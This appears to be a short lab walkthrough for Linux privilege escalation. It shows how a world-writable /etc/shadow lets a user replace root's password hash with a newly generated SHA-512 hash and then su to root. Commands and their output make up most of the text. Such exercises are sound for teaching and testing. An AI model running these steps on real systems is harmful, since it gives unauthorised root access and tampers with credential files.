1. Check the permissions of the /etc /shadow file:

```bash
./lse.sh -l 1 -i | more
```

```bash
ls -l /etc/shadow
```

-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow

Note that it is world writable.

2. Copy / save the contents of /etc/shadow so we can restore it later.

3. Generate a new SHA-512 password hash:

```bash
mkpasswd -m sha-512 newpassword
```

```bash
$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
```

4. Edit the /etc/shadow and replace the root user’s

password hash with the one we generated.

```bash
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
```

5. Use the su command to switch to the root user,

entering the new password when prompted:

```bash
su
```

```bash
newpassword
```

```bash
id
```

uid=0(root) gid=0(root) groups=0(root)
